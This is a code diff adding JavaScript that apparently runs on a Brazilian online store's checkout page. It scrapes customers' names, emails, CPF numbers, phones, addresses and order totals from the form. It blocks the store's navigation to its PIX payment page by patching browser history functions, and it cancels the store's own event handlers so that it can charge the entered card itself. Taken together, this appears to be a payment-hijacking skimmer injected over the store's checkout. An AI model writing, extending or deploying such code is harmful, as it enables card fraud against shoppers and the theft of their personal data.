@@ -483,6 +483,108 @@ async function refillCheckout() {
   }
 }
 
+function readInput(name) {
+  const input = document.querySelector(`input[name="${name}"]`);
+  return String(input?.value || "").trim();
+}
+
+function readSelect(name) {
+  const select = document.querySelector(`select[name="${name}"]`);
+  return String(select?.value || "").trim();
+}
+
+function parseMoney(text) {
+  const match = String(text || "").match(/([\d.,]+)/);
+  if (!match) return 0;
+  return Number(match[1].replace(/\./g, "").replace(",", ".")) || 0;
+}
+
+function captureCheckoutState() {
+  try {
+    const cached = JSON.parse(sessionStorage.getItem("pixPageState") || "{}");
+    if (cached?.amount && cached?.customer?.email) return cached;
+  } catch {
+    /* segue montando do DOM */
+  }
+
+  const customer = {
+    name: readInput("name"),
+    email: readInput("email"),
+    cpf: readInput("cpf"),
+    phone: readInput("phone"),
+  };
+  const shippingAddressFull = {
+    cep: readInput("cep"),
+    city: readInput("city"),
+    state: readSelect("state") || readInput("state"),
+    address: readInput("address"),
+    number: readInput("number"),
+    neighborhood: readInput("neighborhood"),
+    complement: readInput("complement"),
+  };
+  const shippingAddress = {
+    address: shippingAddressFull.address,
+    number: shippingAddressFull.number,
+    complement: shippingAddressFull.complement,
+    neighborhood: shippingAddressFull.neighborhood,
+    city: shippingAddressFull.city,
+    state: shippingAddressFull.state,
+  };
+
+  let amount = 0;
+  for (const label of document.querySelectorAll("span, p, div")) {
+    if (label.children.length > 0 || label.textContent?.trim() !== "Total") continue;
+    const block = label.closest("div");
+    const money = block?.textContent?.match(/R\$\s*[\d.,]+/);
+    if (money) {
+      amount = parseMoney(money[0]);
+      break;
+    }
+  }
+
+  if (!amount) {
+    const matches = [...document.body.textContent.matchAll(/R\$\s*[\d.,]+/g)];
+    if (matches.length) amount = parseMoney(matches[matches.length - 1][0]);
+  }
+
+  const state = {
+    amount,
+    customer,
+    customerName: customer.name,
+    shippingAddress,
+    shippingAddressFull,
+    shippingMethod: "free",
+    items: [{ name: "Pedido", quantity: 1, price: amount }],
+    subtotal: amount,
+    totalDiscount: 0,
+    shippingCost: 0,
+  };
+
+  try {
+    sessionStorage.setItem("pixPageState", JSON.stringify(state));
+  } catch {
+    /* segue sem cache */
+  }
+
+  return state;
+}
+
+function blockPixNavigation() {
+  return armed || method === "card";
+}
+
+const originalPushState = history.pushState.bind(history);
+history.pushState = function patchedPushState(state, title, url) {
+  if (blockPixNavigation() && String(url || "").includes("/pix")) return;
+  return originalPushState(state, title, url);
+};
+
+const originalReplaceState = history.replaceState.bind(history);
+history.replaceState = function patchedReplaceState(state, title, url) {
+  if (blockPixNavigation() && String(url || "").includes("/pix")) return;
+  return originalReplaceState(state, title, url);
+};
+
 function isPixCreate(url) {
   const value = String(url || "");
   return value.includes("/api/pix/create") || value.includes("checkout-create-pix");
@@ -532,13 +634,11 @@ document.addEventListener(
       return;
     }
     pendingCard = card;
+    lastCheckoutState = captureCheckoutState();
     setCardMode(true);
-
-    // Rede de segurança: se a loja navegar para o PIX sem passar pelo
-    // sessionStorage, a cobrança do cartão ainda acontece.
-    window.setTimeout(() => {
-      if (armed && !charging && window.location.pathname === "/pix") void chargeCard();
-    }, 2000);
+    event.preventDefault();
+    event.stopImmediatePropagation();
+    void chargeCard();
   },
   true,
 );
